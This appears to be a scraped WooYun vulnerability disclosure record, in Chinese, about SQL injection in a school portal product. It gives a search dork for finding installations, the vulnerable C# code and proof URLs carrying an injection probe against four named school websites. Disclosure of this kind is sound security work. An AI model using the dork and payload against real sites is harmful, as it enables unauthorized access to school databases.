{"id": 34796, "wybug_id": "wooyun-2015-0105458", "wybug_title": "某通用数字化校园平台#SQL6", "wybug_corp": "浙江皓翰科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-04-03 10:28", "wybug_open_date": "2015-07-07 08:16", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-07：\t细节向公众公开  简要描述： RT 详细说明：  关键词：inurl:IneduPortal/index.aspx\n厂商：浙江皓翰科技有限公司官网：http://www.yuysoft.com/index.asp\n文件：IneduPortal/Components/Teacher/ShowTeacher.aspx代码：\nprivate void Page_Load(object sender, EventArgs e){\tthis.BindConfine(CommFun.CleanInput(this.Request.QueryString[\"id\"]));\tint value = Conversions.ToInteger(this.Request[\"famid\"]);\tint num = 0;\tstring text = \"select * from FamousTeacher where famid=\" + Conversions.ToString(value);\tSqlDataReader sqlDataReader = SqlHelper.ExecuteReader(BasePage.strConnect, 1, text);\tif (sqlDataReader.Read())\t{\t\tthis.Brief.Text = Conversions.ToString(sqlDataReader[\"brief\"]);\t\tnum = Conversions.ToInteger(sqlDataReader[\"TeacherId\"]);\t\tstring text2 = Conversions.ToString(Operators.ConcatenateObject(\"../../upsource/teacher/images/\", sqlDataReader[\"photo\"]));\t\tstring path = this.Server.MapPath(text2);\t\tif (!File.Exists(path))\t\t{\t\t\tthis.TPic.ImageUrl = \"../../images/default/images/sorry.gif\";\t\t}\t\telse\t\t{\t\t\tthis.TPic.ImageUrl = text2;\t\t}\t}\tsqlDataReader.Close();\tif (num != 0)\t{\t\ttext = \"select * from TB_Teacher_Experience where bas_id=\" + Conversions.ToString(num) + \" and cod_id='01'\";\t\tsqlDataReader = SqlHelper.ExecuteReader(BasePage.erpConnect, 1, text);\t\twhile (sqlDataReader.Read())\t\t{\t\t\tLabel expInfo = this.ExpInfo;\t\t\texpInfo.Text = Conversions.ToString(Operators.AddObject(expInfo.Text, Operators.ConcatenateObject(sqlDataReader[\"Exp_Infor\"], \"<br>\")));\t\t}\t\tsqlDataReader.Close();\t\ttext = \"select * from VW_Teacher_Infor where bas_id=\" + Conversions.ToString(num);\t\tsqlDataReader = SqlHelper.ExecuteReader(BasePage.erpConnect, 1, text);\t\tif (sqlDataReader.Read())\t\t{\t\t\tthis.TName.Text = Conversions.ToString(sqlDataReader[\"bas_name\"]);\t\t\tthis.TSex.Text = Conversions.ToString(sqlDataReader[\"bas_sex\"]);\t\t\tthis.Tschool.Text = Conversions.ToString(sqlDataReader[\"sch_ShortName\"]);\t\t\tthis.T_Nation.Text = Conversions.ToString(sqlDataReader[\"bas_Nationality\"]);\t\t\tthis.T_Skill.Text = Conversions.ToString(Interaction.IIf(Information.IsDBNull(RuntimeHelpers.GetObjectValue(sqlDataReader[\"bas_skill\"])), \"无\", RuntimeHelpers.GetObjectValue(sqlDataReader[\"bas_skill\"])));\t\t}\t\tsqlDataReader.Close();\t}}\n\nthis.BindConfine(CommFun.CleanInput(this.Request.QueryString[\"id\"])); //可以看到这里的id没有int定义整数型，导致注入产生。\n   漏洞证明：  相关案例：\nhttp://www.cpdxx.com/IneduPortal/Components/Teacher/ShowTeacher.aspx?famid=1&id=1%20and%20user>0http://sndyxx.cn/IneduPortal/Components/Teacher/ShowTeacher.aspx?famid=1&id=1%20and%20user>0http://www.fhqcxx.com/IneduPortal/Components/Teacher/ShowTeacher.aspx?famid=1&id=1%20and%20user>0http://www.gx2x.cn/IneduPortal/Components/Teacher/ShowTeacher.aspx?famid=1&id=1%20and%20user>0\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-04-08 08:14 厂商回复： 暂未建立与软件生产厂商的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}